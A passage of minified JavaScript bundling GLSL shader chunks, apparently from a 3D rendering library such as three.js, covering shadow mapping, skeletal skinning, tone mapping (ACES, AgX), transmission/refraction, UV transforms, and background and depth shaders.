#endif`,Zd=`#if ( defined( USE_SHADOWMAP ) && ( NUM_DIR_LIGHT_SHADOWS > 0 || NUM_POINT_LIGHT_SHADOWS > 0 ) ) || ( NUM_SPOT_LIGHT_COORDS > 0 )
	vec3 shadowWorldNormal = inverseTransformDirection( transformedNormal, viewMatrix );
	vec4 shadowWorldPosition;
#endif
#if defined( USE_SHADOWMAP )
	#if NUM_DIR_LIGHT_SHADOWS > 0
		#pragma unroll_loop_start
		for ( int i = 0; i < NUM_DIR_LIGHT_SHADOWS; i ++ ) {
			shadowWorldPosition = worldPosition + vec4( shadowWorldNormal * directionalLightShadows[ i ].shadowNormalBias, 0 );
			vDirectionalShadowCoord[ i ] = directionalShadowMatrix[ i ] * shadowWorldPosition;
		}
		#pragma unroll_loop_end
	#endif
	#if NUM_POINT_LIGHT_SHADOWS > 0
		#pragma unroll_loop_start
		for ( int i = 0; i < NUM_POINT_LIGHT_SHADOWS; i ++ ) {
			shadowWorldPosition = worldPosition + vec4( shadowWorldNormal * pointLightShadows[ i ].shadowNormalBias, 0 );
			vPointShadowCoord[ i ] = pointShadowMatrix[ i ] * shadowWorldPosition;
		}
		#pragma unroll_loop_end
	#endif
#endif
#if NUM_SPOT_LIGHT_COORDS > 0
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_SPOT_LIGHT_COORDS; i ++ ) {
		shadowWorldPosition = worldPosition;
		#if ( defined( USE_SHADOWMAP ) && UNROLLED_LOOP_INDEX < NUM_SPOT_LIGHT_SHADOWS )
			shadowWorldPosition.xyz += shadowWorldNormal * spotLightShadows[ i ].shadowNormalBias;
		#endif
		vSpotLightCoord[ i ] = spotLightMatrix[ i ] * shadowWorldPosition;
	}
	#pragma unroll_loop_end
#endif`,Qd=`float getShadowMask() {
	float shadow = 1.0;
	#ifdef USE_SHADOWMAP
	#if NUM_DIR_LIGHT_SHADOWS > 0
	DirectionalLightShadow directionalLight;
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_DIR_LIGHT_SHADOWS; i ++ ) {
		directionalLight = directionalLightShadows[ i ];
		shadow *= receiveShadow ? getShadow( directionalShadowMap[ i ], directionalLight.shadowMapSize, directionalLight.shadowBias, directionalLight.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;
	}
	#pragma unroll_loop_end
	#endif
	#if NUM_SPOT_LIGHT_SHADOWS > 0
	SpotLightShadow spotLight;
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_SPOT_LIGHT_SHADOWS; i ++ ) {
		spotLight = spotLightShadows[ i ];
		shadow *= receiveShadow ? getShadow( spotShadowMap[ i ], spotLight.shadowMapSize, spotLight.shadowBias, spotLight.shadowRadius, vSpotLightCoord[ i ] ) : 1.0;
	}
	#pragma unroll_loop_end
	#endif
	#if NUM_POINT_LIGHT_SHADOWS > 0
	PointLightShadow pointLight;
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_POINT_LIGHT_SHADOWS; i ++ ) {
		pointLight = pointLightShadows[ i ];
		shadow *= receiveShadow ? getPointShadow( pointShadowMap[ i ], pointLight.shadowMapSize, pointLight.shadowBias, pointLight.shadowRadius, vPointShadowCoord[ i ], pointLight.shadowCameraNear, pointLight.shadowCameraFar ) : 1.0;
	}
	#pragma unroll_loop_end
	#endif
	#endif
	return shadow;
}`,Jd=`#ifdef USE_SKINNING
	mat4 boneMatX = getBoneMatrix( skinIndex.x );
	mat4 boneMatY = getBoneMatrix( skinIndex.y );
	mat4 boneMatZ = getBoneMatrix( skinIndex.z );
	mat4 boneMatW = getBoneMatrix( skinIndex.w );
#endif`,eu=`#ifdef USE_SKINNING
	uniform mat4 bindMatrix;
	uniform mat4 bindMatrixInverse;
	uniform highp sampler2D boneTexture;
	mat4 getBoneMatrix( const in float i ) {
		int size = textureSize( boneTexture, 0 ).x;
		int j = int( i ) * 4;
		int x = j % size;
		int y = j / size;
		vec4 v1 = texelFetch( boneTexture, ivec2( x, y ), 0 );
		vec4 v2 = texelFetch( boneTexture, ivec2( x + 1, y ), 0 );
		vec4 v3 = texelFetch( boneTexture, ivec2( x + 2, y ), 0 );
		vec4 v4 = texelFetch( boneTexture, ivec2( x + 3, y ), 0 );
		return mat4( v1, v2, v3, v4 );
	}
#endif`,tu=`#ifdef USE_SKINNING
	vec4 skinVertex = bindMatrix * vec4( transformed, 1.0 );
	vec4 skinned = vec4( 0.0 );
	skinned += boneMatX * skinVertex * skinWeight.x;
	skinned += boneMatY * skinVertex * skinWeight.y;
	skinned += boneMatZ * skinVertex * skinWeight.z;
	skinned += boneMatW * skinVertex * skinWeight.w;
	transformed = ( bindMatrixInverse * skinned ).xyz;
#endif`,nu=`#ifdef USE_SKINNING
	mat4 skinMatrix = mat4( 0.0 );
	skinMatrix += skinWeight.x * boneMatX;
	skinMatrix += skinWeight.y * boneMatY;
	skinMatrix += skinWeight.z * boneMatZ;
	skinMatrix += skinWeight.w * boneMatW;
	skinMatrix = bindMatrixInverse * skinMatrix * bindMatrix;
	objectNormal = vec4( skinMatrix * vec4( objectNormal, 0.0 ) ).xyz;
	#ifdef USE_TANGENT
		objectTangent = vec4( skinMatrix * vec4( objectTangent, 0.0 ) ).xyz;
	#endif
#endif`,iu=`float specularStrength;
#ifdef USE_SPECULARMAP
	vec4 texelSpecular = texture2D( specularMap, vSpecularMapUv );
	specularStrength = texelSpecular.r;
#else
	specularStrength = 1.0;
#endif`,ru=`#ifdef USE_SPECULARMAP
	uniform sampler2D specularMap;
#endif`,su=`#if defined( TONE_MAPPING )
	gl_FragColor.rgb = toneMapping( gl_FragColor.rgb );
#endif`,au=`#ifndef saturate
#define saturate( a ) clamp( a, 0.0, 1.0 )
#endif
uniform float toneMappingExposure;
vec3 LinearToneMapping( vec3 color ) {
	return saturate( toneMappingExposure * color );
}
vec3 ReinhardToneMapping( vec3 color ) {
	color *= toneMappingExposure;
	return saturate( color / ( vec3( 1.0 ) + color ) );
}
vec3 OptimizedCineonToneMapping( vec3 color ) {
	color *= toneMappingExposure;
	color = max( vec3( 0.0 ), color - 0.004 );
	return pow( ( color * ( 6.2 * color + 0.5 ) ) / ( color * ( 6.2 * color + 1.7 ) + 0.06 ), vec3( 2.2 ) );
}
vec3 RRTAndODTFit( vec3 v ) {
	vec3 a = v * ( v + 0.0245786 ) - 0.000090537;
	vec3 b = v * ( 0.983729 * v + 0.4329510 ) + 0.238081;
	return a / b;
}
vec3 ACESFilmicToneMapping( vec3 color ) {
	const mat3 ACESInputMat = mat3(
		vec3( 0.59719, 0.07600, 0.02840 ),		vec3( 0.35458, 0.90834, 0.13383 ),
		vec3( 0.04823, 0.01566, 0.83777 )
	);
	const mat3 ACESOutputMat = mat3(
		vec3(  1.60475, -0.10208, -0.00327 ),		vec3( -0.53108,  1.10813, -0.07276 ),
		vec3( -0.07367, -0.00605,  1.07602 )
	);
	color *= toneMappingExposure / 0.6;
	color = ACESInputMat * color;
	color = RRTAndODTFit( color );
	color = ACESOutputMat * color;
	return saturate( color );
}
const mat3 LINEAR_REC2020_TO_LINEAR_SRGB = mat3(
	vec3( 1.6605, - 0.1246, - 0.0182 ),
	vec3( - 0.5876, 1.1329, - 0.1006 ),
	vec3( - 0.0728, - 0.0083, 1.1187 )
);
const mat3 LINEAR_SRGB_TO_LINEAR_REC2020 = mat3(
	vec3( 0.6274, 0.0691, 0.0164 ),
	vec3( 0.3293, 0.9195, 0.0880 ),
	vec3( 0.0433, 0.0113, 0.8956 )
);
vec3 agxDefaultContrastApprox( vec3 x ) {
	vec3 x2 = x * x;
	vec3 x4 = x2 * x2;
	return + 15.5 * x4 * x2
		- 40.14 * x4 * x
		+ 31.96 * x4
		- 6.868 * x2 * x
		+ 0.4298 * x2
		+ 0.1191 * x
		- 0.00232;
}
vec3 AgXToneMapping( vec3 color ) {
	const mat3 AgXInsetMatrix = mat3(
		vec3( 0.856627153315983, 0.137318972929847, 0.11189821299995 ),
		vec3( 0.0951212405381588, 0.761241990602591, 0.0767994186031903 ),
		vec3( 0.0482516061458583, 0.101439036467562, 0.811302368396859 )
	);
	const mat3 AgXOutsetMatrix = mat3(
		vec3( 1.1271005818144368, - 0.1413297634984383, - 0.14132976349843826 ),
		vec3( - 0.11060664309660323, 1.157823702216272, - 0.11060664309660294 ),
		vec3( - 0.016493938717834573, - 0.016493938717834257, 1.2519364065950405 )
	);
	const float AgxMinEv = - 12.47393;	const float AgxMaxEv = 4.026069;
	color = LINEAR_SRGB_TO_LINEAR_REC2020 * color;
	color *= toneMappingExposure;
	color = AgXInsetMatrix * color;
	color = max( color, 1e-10 );	color = log2( color );
	color = ( color - AgxMinEv ) / ( AgxMaxEv - AgxMinEv );
	color = clamp( color, 0.0, 1.0 );
	color = agxDefaultContrastApprox( color );
	color = AgXOutsetMatrix * color;
	color = pow( max( vec3( 0.0 ), color ), vec3( 2.2 ) );
	color = LINEAR_REC2020_TO_LINEAR_SRGB * color;
	return color;
}
vec3 CustomToneMapping( vec3 color ) { return color; }`,ou=`#ifdef USE_TRANSMISSION
	material.transmission = transmission;
	material.transmissionAlpha = 1.0;
	material.thickness = thickness;
	material.attenuationDistance = attenuationDistance;
	material.attenuationColor = attenuationColor;
	#ifdef USE_TRANSMISSIONMAP
		material.transmission *= texture2D( transmissionMap, vTransmissionMapUv ).r;
	#endif
	#ifdef USE_THICKNESSMAP
		material.thickness *= texture2D( thicknessMap, vThicknessMapUv ).g;
	#endif
	vec3 pos = vWorldPosition;
	vec3 v = normalize( cameraPosition - pos );
	vec3 n = inverseTransformDirection( normal, viewMatrix );
	vec4 transmitted = getIBLVolumeRefraction(
		n, v, material.roughness, material.diffuseColor, material.specularColor, material.specularF90,
		pos, modelMatrix, viewMatrix, projectionMatrix, material.ior, material.thickness,
		material.attenuationColor, material.attenuationDistance );
	material.transmissionAlpha = mix( material.transmissionAlpha, transmitted.a, material.transmission );
	totalDiffuse = mix( totalDiffuse, transmitted.rgb, material.transmission );
#endif`,lu=`#ifdef USE_TRANSMISSION
	uniform float transmission;
	uniform float thickness;
	uniform float attenuationDistance;
	uniform vec3 attenuationColor;
	#ifdef USE_TRANSMISSIONMAP
		uniform sampler2D transmissionMap;
	#endif
	#ifdef USE_THICKNESSMAP
		uniform sampler2D thicknessMap;
	#endif
	uniform vec2 transmissionSamplerSize;
	uniform sampler2D transmissionSamplerMap;
	uniform mat4 modelMatrix;
	uniform mat4 projectionMatrix;
	varying vec3 vWorldPosition;
	float w0( float a ) {
		return ( 1.0 / 6.0 ) * ( a * ( a * ( - a + 3.0 ) - 3.0 ) + 1.0 );
	}
	float w1( float a ) {
		return ( 1.0 / 6.0 ) * ( a *  a * ( 3.0 * a - 6.0 ) + 4.0 );
	}
	float w2( float a ){
		return ( 1.0 / 6.0 ) * ( a * ( a * ( - 3.0 * a + 3.0 ) + 3.0 ) + 1.0 );
	}
	float w3( float a ) {
		return ( 1.0 / 6.0 ) * ( a * a * a );
	}
	float g0( float a ) {
		return w0( a ) + w1( a );
	}
	float g1( float a ) {
		return w2( a ) + w3( a );
	}
	float h0( float a ) {
		return - 1.0 + w1( a ) / ( w0( a ) + w1( a ) );
	}
	float h1( float a ) {
		return 1.0 + w3( a ) / ( w2( a ) + w3( a ) );
	}
	vec4 bicubic( sampler2D tex, vec2 uv, vec4 texelSize, float lod ) {
		uv = uv * texelSize.zw + 0.5;
		vec2 iuv = floor( uv );
		vec2 fuv = fract( uv );
		float g0x = g0( fuv.x );
		float g1x = g1( fuv.x );
		float h0x = h0( fuv.x );
		float h1x = h1( fuv.x );
		float h0y = h0( fuv.y );
		float h1y = h1( fuv.y );
		vec2 p0 = ( vec2( iuv.x + h0x, iuv.y + h0y ) - 0.5 ) * texelSize.xy;
		vec2 p1 = ( vec2( iuv.x + h1x, iuv.y + h0y ) - 0.5 ) * texelSize.xy;
		vec2 p2 = ( vec2( iuv.x + h0x, iuv.y + h1y ) - 0.5 ) * texelSize.xy;
		vec2 p3 = ( vec2( iuv.x + h1x, iuv.y + h1y ) - 0.5 ) * texelSize.xy;
		return g0( fuv.y ) * ( g0x * textureLod( tex, p0, lod ) + g1x * textureLod( tex, p1, lod ) ) +
			g1( fuv.y ) * ( g0x * textureLod( tex, p2, lod ) + g1x * textureLod( tex, p3, lod ) );
	}
	vec4 textureBicubic( sampler2D sampler, vec2 uv, float lod ) {
		vec2 fLodSize = vec2( textureSize( sampler, int( lod ) ) );
		vec2 cLodSize = vec2( textureSize( sampler, int( lod + 1.0 ) ) );
		vec2 fLodSizeInv = 1.0 / fLodSize;
		vec2 cLodSizeInv = 1.0 / cLodSize;
		vec4 fSample = bicubic( sampler, uv, vec4( fLodSizeInv, fLodSize ), floor( lod ) );
		vec4 cSample = bicubic( sampler, uv, vec4( cLodSizeInv, cLodSize ), ceil( lod ) );
		return mix( fSample, cSample, fract( lod ) );
	}
	vec3 getVolumeTransmissionRay( const in vec3 n, const in vec3 v, const in float thickness, const in float ior, const in mat4 modelMatrix ) {
		vec3 refractionVector = refract( - v, normalize( n ), 1.0 / ior );
		vec3 modelScale;
		modelScale.x = length( vec3( modelMatrix[ 0 ].xyz ) );
		modelScale.y = length( vec3( modelMatrix[ 1 ].xyz ) );
		modelScale.z = length( vec3( modelMatrix[ 2 ].xyz ) );
		return normalize( refractionVector ) * thickness * modelScale;
	}
	float applyIorToRoughness( const in float roughness, const in float ior ) {
		return roughness * clamp( ior * 2.0 - 2.0, 0.0, 1.0 );
	}
	vec4 getTransmissionSample( const in vec2 fragCoord, const in float roughness, const in float ior ) {
		float lod = log2( transmissionSamplerSize.x ) * applyIorToRoughness( roughness, ior );
		return textureBicubic( transmissionSamplerMap, fragCoord.xy, lod );
	}
	vec3 volumeAttenuation( const in float transmissionDistance, const in vec3 attenuationColor, const in float attenuationDistance ) {
		if ( isinf( attenuationDistance ) ) {
			return vec3( 1.0 );
		} else {
			vec3 attenuationCoefficient = -log( attenuationColor ) / attenuationDistance;
			vec3 transmittance = exp( - attenuationCoefficient * transmissionDistance );			return transmittance;
		}
	}
	vec4 getIBLVolumeRefraction( const in vec3 n, const in vec3 v, const in float roughness, const in vec3 diffuseColor,
		const in vec3 specularColor, const in float specularF90, const in vec3 position, const in mat4 modelMatrix,
		const in mat4 viewMatrix, const in mat4 projMatrix, const in float ior, const in float thickness,
		const in vec3 attenuationColor, const in float attenuationDistance ) {
		vec3 transmissionRay = getVolumeTransmissionRay( n, v, thickness, ior, modelMatrix );
		vec3 refractedRayExit = position + transmissionRay;
		vec4 ndcPos = projMatrix * viewMatrix * vec4( refractedRayExit, 1.0 );
		vec2 refractionCoords = ndcPos.xy / ndcPos.w;
		refractionCoords += 1.0;
		refractionCoords /= 2.0;
		vec4 transmittedLight = getTransmissionSample( refractionCoords, roughness, ior );
		vec3 transmittance = diffuseColor * volumeAttenuation( length( transmissionRay ), attenuationColor, attenuationDistance );
		vec3 attenuatedColor = transmittance * transmittedLight.rgb;
		vec3 F = EnvironmentBRDF( n, v, specularColor, specularF90, roughness );
		float transmittanceFactor = ( transmittance.r + transmittance.g + transmittance.b ) / 3.0;
		return vec4( ( 1.0 - F ) * attenuatedColor, 1.0 - ( 1.0 - transmittedLight.a ) * transmittanceFactor );
	}
#endif`,cu=`#if defined( USE_UV ) || defined( USE_ANISOTROPY )
	varying vec2 vUv;
#endif
#ifdef USE_MAP
	varying vec2 vMapUv;
#endif
#ifdef USE_ALPHAMAP
	varying vec2 vAlphaMapUv;
#endif
#ifdef USE_LIGHTMAP
	varying vec2 vLightMapUv;
#endif
#ifdef USE_AOMAP
	varying vec2 vAoMapUv;
#endif
#ifdef USE_BUMPMAP
	varying vec2 vBumpMapUv;
#endif
#ifdef USE_NORMALMAP
	varying vec2 vNormalMapUv;
#endif
#ifdef USE_EMISSIVEMAP
	varying vec2 vEmissiveMapUv;
#endif
#ifdef USE_METALNESSMAP
	varying vec2 vMetalnessMapUv;
#endif
#ifdef USE_ROUGHNESSMAP
	varying vec2 vRoughnessMapUv;
#endif
#ifdef USE_ANISOTROPYMAP
	varying vec2 vAnisotropyMapUv;
#endif
#ifdef USE_CLEARCOATMAP
	varying vec2 vClearcoatMapUv;
#endif
#ifdef USE_CLEARCOAT_NORMALMAP
	varying vec2 vClearcoatNormalMapUv;
#endif
#ifdef USE_CLEARCOAT_ROUGHNESSMAP
	varying vec2 vClearcoatRoughnessMapUv;
#endif
#ifdef USE_IRIDESCENCEMAP
	varying vec2 vIridescenceMapUv;
#endif
#ifdef USE_IRIDESCENCE_THICKNESSMAP
	varying vec2 vIridescenceThicknessMapUv;
#endif
#ifdef USE_SHEEN_COLORMAP
	varying vec2 vSheenColorMapUv;
#endif
#ifdef USE_SHEEN_ROUGHNESSMAP
	varying vec2 vSheenRoughnessMapUv;
#endif
#ifdef USE_SPECULARMAP
	varying vec2 vSpecularMapUv;
#endif
#ifdef USE_SPECULAR_COLORMAP
	varying vec2 vSpecularColorMapUv;
#endif
#ifdef USE_SPECULAR_INTENSITYMAP
	varying vec2 vSpecularIntensityMapUv;
#endif
#ifdef USE_TRANSMISSIONMAP
	uniform mat3 transmissionMapTransform;
	varying vec2 vTransmissionMapUv;
#endif
#ifdef USE_THICKNESSMAP
	uniform mat3 thicknessMapTransform;
	varying vec2 vThicknessMapUv;
#endif`,du=`#if defined( USE_UV ) || defined( USE_ANISOTROPY )
	varying vec2 vUv;
#endif
#ifdef USE_MAP
	uniform mat3 mapTransform;
	varying vec2 vMapUv;
#endif
#ifdef USE_ALPHAMAP
	uniform mat3 alphaMapTransform;
	varying vec2 vAlphaMapUv;
#endif
#ifdef USE_LIGHTMAP
	uniform mat3 lightMapTransform;
	varying vec2 vLightMapUv;
#endif
#ifdef USE_AOMAP
	uniform mat3 aoMapTransform;
	varying vec2 vAoMapUv;
#endif
#ifdef USE_BUMPMAP
	uniform mat3 bumpMapTransform;
	varying vec2 vBumpMapUv;
#endif
#ifdef USE_NORMALMAP
	uniform mat3 normalMapTransform;
	varying vec2 vNormalMapUv;
#endif
#ifdef USE_DISPLACEMENTMAP
	uniform mat3 displacementMapTransform;
	varying vec2 vDisplacementMapUv;
#endif
#ifdef USE_EMISSIVEMAP
	uniform mat3 emissiveMapTransform;
	varying vec2 vEmissiveMapUv;
#endif
#ifdef USE_METALNESSMAP
	uniform mat3 metalnessMapTransform;
	varying vec2 vMetalnessMapUv;
#endif
#ifdef USE_ROUGHNESSMAP
	uniform mat3 roughnessMapTransform;
	varying vec2 vRoughnessMapUv;
#endif
#ifdef USE_ANISOTROPYMAP
	uniform mat3 anisotropyMapTransform;
	varying vec2 vAnisotropyMapUv;
#endif
#ifdef USE_CLEARCOATMAP
	uniform mat3 clearcoatMapTransform;
	varying vec2 vClearcoatMapUv;
#endif
#ifdef USE_CLEARCOAT_NORMALMAP
	uniform mat3 clearcoatNormalMapTransform;
	varying vec2 vClearcoatNormalMapUv;
#endif
#ifdef USE_CLEARCOAT_ROUGHNESSMAP
	uniform mat3 clearcoatRoughnessMapTransform;
	varying vec2 vClearcoatRoughnessMapUv;
#endif
#ifdef USE_SHEEN_COLORMAP
	uniform mat3 sheenColorMapTransform;
	varying vec2 vSheenColorMapUv;
#endif
#ifdef USE_SHEEN_ROUGHNESSMAP
	uniform mat3 sheenRoughnessMapTransform;
	varying vec2 vSheenRoughnessMapUv;
#endif
#ifdef USE_IRIDESCENCEMAP
	uniform mat3 iridescenceMapTransform;
	varying vec2 vIridescenceMapUv;
#endif
#ifdef USE_IRIDESCENCE_THICKNESSMAP
	uniform mat3 iridescenceThicknessMapTransform;
	varying vec2 vIridescenceThicknessMapUv;
#endif
#ifdef USE_SPECULARMAP
	uniform mat3 specularMapTransform;
	varying vec2 vSpecularMapUv;
#endif
#ifdef USE_SPECULAR_COLORMAP
	uniform mat3 specularColorMapTransform;
	varying vec2 vSpecularColorMapUv;
#endif
#ifdef USE_SPECULAR_INTENSITYMAP
	uniform mat3 specularIntensityMapTransform;
	varying vec2 vSpecularIntensityMapUv;
#endif
#ifdef USE_TRANSMISSIONMAP
	uniform mat3 transmissionMapTransform;
	varying vec2 vTransmissionMapUv;
#endif
#ifdef USE_THICKNESSMAP
	uniform mat3 thicknessMapTransform;
	varying vec2 vThicknessMapUv;
#endif`,uu=`#if defined( USE_UV ) || defined( USE_ANISOTROPY )
	vUv = vec3( uv, 1 ).xy;
#endif
#ifdef USE_MAP
	vMapUv = ( mapTransform * vec3( MAP_UV, 1 ) ).xy;
#endif
#ifdef USE_ALPHAMAP
	vAlphaMapUv = ( alphaMapTransform * vec3( ALPHAMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_LIGHTMAP
	vLightMapUv = ( lightMapTransform * vec3( LIGHTMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_AOMAP
	vAoMapUv = ( aoMapTransform * vec3( AOMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_BUMPMAP
	vBumpMapUv = ( bumpMapTransform * vec3( BUMPMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_NORMALMAP
	vNormalMapUv = ( normalMapTransform * vec3( NORMALMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_DISPLACEMENTMAP
	vDisplacementMapUv = ( displacementMapTransform * vec3( DISPLACEMENTMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_EMISSIVEMAP
	vEmissiveMapUv = ( emissiveMapTransform * vec3( EMISSIVEMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_METALNESSMAP
	vMetalnessMapUv = ( metalnessMapTransform * vec3( METALNESSMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_ROUGHNESSMAP
	vRoughnessMapUv = ( roughnessMapTransform * vec3( ROUGHNESSMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_ANISOTROPYMAP
	vAnisotropyMapUv = ( anisotropyMapTransform * vec3( ANISOTROPYMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_CLEARCOATMAP
	vClearcoatMapUv = ( clearcoatMapTransform * vec3( CLEARCOATMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_CLEARCOAT_NORMALMAP
	vClearcoatNormalMapUv = ( clearcoatNormalMapTransform * vec3( CLEARCOAT_NORMALMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_CLEARCOAT_ROUGHNESSMAP
	vClearcoatRoughnessMapUv = ( clearcoatRoughnessMapTransform * vec3( CLEARCOAT_ROUGHNESSMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_IRIDESCENCEMAP
	vIridescenceMapUv = ( iridescenceMapTransform * vec3( IRIDESCENCEMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_IRIDESCENCE_THICKNESSMAP
	vIridescenceThicknessMapUv = ( iridescenceThicknessMapTransform * vec3( IRIDESCENCE_THICKNESSMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_SHEEN_COLORMAP
	vSheenColorMapUv = ( sheenColorMapTransform * vec3( SHEEN_COLORMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_SHEEN_ROUGHNESSMAP
	vSheenRoughnessMapUv = ( sheenRoughnessMapTransform * vec3( SHEEN_ROUGHNESSMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_SPECULARMAP
	vSpecularMapUv = ( specularMapTransform * vec3( SPECULARMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_SPECULAR_COLORMAP
	vSpecularColorMapUv = ( specularColorMapTransform * vec3( SPECULAR_COLORMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_SPECULAR_INTENSITYMAP
	vSpecularIntensityMapUv = ( specularIntensityMapTransform * vec3( SPECULAR_INTENSITYMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_TRANSMISSIONMAP
	vTransmissionMapUv = ( transmissionMapTransform * vec3( TRANSMISSIONMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_THICKNESSMAP
	vThicknessMapUv = ( thicknessMapTransform * vec3( THICKNESSMAP_UV, 1 ) ).xy;
#endif`,pu=`#if defined( USE_ENVMAP ) || defined( DISTANCE ) || defined ( USE_SHADOWMAP ) || defined ( USE_TRANSMISSION ) || NUM_SPOT_LIGHT_COORDS > 0
	vec4 worldPosition = vec4( transformed, 1.0 );
	#ifdef USE_BATCHING
		worldPosition = batchingMatrix * worldPosition;
	#endif
	#ifdef USE_INSTANCING
		worldPosition = instanceMatrix * worldPosition;
	#endif
	worldPosition = modelMatrix * worldPosition;
#endif`;const fu=`varying vec2 vUv;
uniform mat3 uvTransform;
void main() {
	vUv = ( uvTransform * vec3( uv, 1 ) ).xy;
	gl_Position = vec4( position.xy, 1.0, 1.0 );
}`,hu=`uniform sampler2D t2D;
uniform float backgroundIntensity;
varying vec2 vUv;
void main() {
	vec4 texColor = texture2D( t2D, vUv );
	#ifdef DECODE_VIDEO_TEXTURE
		texColor = vec4( mix( pow( texColor.rgb * 0.9478672986 + vec3( 0.0521327014 ), vec3( 2.4 ) ), texColor.rgb * 0.0773993808, vec3( lessThanEqual( texColor.rgb, vec3( 0.04045 ) ) ) ), texColor.w );
	#endif
	texColor.rgb *= backgroundIntensity;
	gl_FragColor = texColor;
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
}`,mu=`varying vec3 vWorldDirection;
#include <common>
void main() {
	vWorldDirection = transformDirection( position, modelMatrix );
	#include <begin_vertex>
	#include <project_vertex>
	gl_Position.z = gl_Position.w;
}`,_u=`#ifdef ENVMAP_TYPE_CUBE
	uniform samplerCube envMap;
#elif defined( ENVMAP_TYPE_CUBE_UV )
	uniform sampler2D envMap;
#endif
uniform float flipEnvMap;
uniform float backgroundBlurriness;
uniform float backgroundIntensity;
varying vec3 vWorldDirection;
#include <cube_uv_reflection_fragment>
void main() {
	#ifdef ENVMAP_TYPE_CUBE
		vec4 texColor = textureCube( envMap, vec3( flipEnvMap * vWorldDirection.x, vWorldDirection.yz ) );
	#elif defined( ENVMAP_TYPE_CUBE_UV )
		vec4 texColor = textureCubeUV( envMap, vWorldDirection, backgroundBlurriness );
	#else
		vec4 texColor = vec4( 0.0, 0.0, 0.0, 1.0 );
	#endif
	texColor.rgb *= backgroundIntensity;
	gl_FragColor = texColor;
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
}`,gu=`varying vec3 vWorldDirection;
#include <common>
void main() {
	vWorldDirection = transformDirection( position, modelMatrix );
	#include <begin_vertex>
	#include <project_vertex>
	gl_Position.z = gl_Position.w;
}`,vu=`uniform samplerCube tCube;
uniform float tFlip;
uniform float opacity;
varying vec3 vWorldDirection;
void main() {
	vec4 texColor = textureCube( tCube, vec3( tFlip * vWorldDirection.x, vWorldDirection.yz ) );
	gl_FragColor = texColor;
	gl_FragColor.a *= opacity;
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
}`,xu=`#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
varying vec2 vHighPrecisionZW;
void main() {
	#include <uv_vertex>
	#include <batching_vertex>
	#include <skinbase_vertex>
	#ifdef USE_DISPLACEMENTMAP
		#include <beginnormal_vertex>
		#include <morphnormal_vertex>
		#include <skinnormal_vertex>
	#endif
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	vHighPrecisionZW = gl_Position.zw;
}`,Eu=`#if DEPTH_PACKING == 3200
	uniform float opacity;
#endif
#include <common>
#include <packing>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
varying vec2 vHighPrecisionZW;
void main() {
	#include <clipping_planes_fragment>
	vec4 diffuseColor = vec4( 1.0 );
	#if DEPTH_PACKING == 3200
		diffuseColor.a = opacity;
	#endif
	#include <map_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <logdepthbuf_fragment>
	float fragCoordZ = 0.5 * vHighPrecisionZW[0] / vHighPrecisionZW[1] + 0.5;
	#if DEPTH_PACKING == 3200
		gl_FragColor = vec4( vec3( 1.0 - fragCoordZ ), opacity );
	#elif DEPTH_PACKING == 3201
		gl_FragColor = packDepthToRGBA( fragCoordZ );
	#endif
}`,yu=`#define DISTANCE
varying vec3 vWorldPosition;
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <batching_vertex>
	#include <skinbase_vertex>
	#ifdef USE_DISPLACEMENTMAP
		#include <beginnormal_vertex>
		#include <morphnormal_vertex>
		#include <skinnormal_vertex>
	#endif
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <worldpos_vertex>
	#include <clipping_planes_vertex>
	vWorldPosition = worldPosition.xyz;
}`,Su=`#define DISTANCE
uniform vec3 referencePosition;
uniform float nearDistance;
uniform float farDistance;
varying vec3 vWorldPosition;
#include <common>
#include <packing>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <clipping_planes_pars_fragment>
void main () {
	#include <clipping_planes_fragment>
	vec4 diffuseColor = vec4( 1.0 );
	#include <map_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	float dist = length( vWorldPosition - referencePosition );
